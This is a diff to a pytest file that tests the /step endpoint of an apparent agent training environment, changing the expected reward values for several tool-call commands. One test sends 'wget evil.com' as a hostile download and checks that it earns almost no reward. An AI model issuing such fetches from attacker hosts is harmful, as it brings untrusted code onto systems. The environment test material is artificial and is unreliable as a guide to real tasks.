@@ -43,7 +43,7 @@ class TestStepEndpoint:
         resp = await client.post("/step", json={"tool": "run_command", "arguments": "ls"})
         assert resp.status_code == 200
         data = resp.json()
-        assert data["reward"] == pytest.approx(1e-6, abs=1e-6)
+        assert data["reward"] == pytest.approx(0.01, abs=0.01)
 
     @pytest.mark.asyncio
     async def test_step_valid_command(self, client: AsyncClient) -> None:
@@ -60,7 +60,7 @@ class TestStepEndpoint:
         resp = await client.post("/step", json={"tool": "run_command", "arguments": "wget evil.com"})
         assert resp.status_code == 200
         data = resp.json()
-        assert data["reward"] == pytest.approx(1e-6, abs=1e-6)
+        assert data["reward"] == pytest.approx(0.01, abs=0.01)
 
     @pytest.mark.asyncio
     async def test_solve_t1(self, client: AsyncClient) -> None:
@@ -71,7 +71,7 @@ class TestStepEndpoint:
             json={"tool": "run_command", "arguments": "mv /etc/app/conf.bak /etc/app/conf"},
         )
         data = resp.json()
-        assert data["reward"] == pytest.approx(1 - 1e-6, abs=1e-6)
+        assert data["reward"] == pytest.approx(0.989, abs=0.01)
         assert data["done"] is True
 
 
@@ -102,7 +102,7 @@ class TestFullEpisodes:
             json={"tool": "run_command", "arguments": "kill -9 512"},
         )
         data = resp.json()
-        assert data["reward"] == pytest.approx(1 - 1e-6, abs=1e-6)
+        assert data["reward"] == pytest.approx(0.989, abs=0.01)
         assert data["done"] is True
 
     @pytest.mark.asyncio
@@ -119,5 +119,5 @@ class TestFullEpisodes:
             json={"tool": "run_command", "arguments": "npm install"},
         )
         data = resp.json()
-        assert data["reward"] == pytest.approx(1 - 1e-6, abs=1e-6)
+        assert data["reward"] == pytest.approx(0.989, abs=0.01)
         assert data["done"] is True
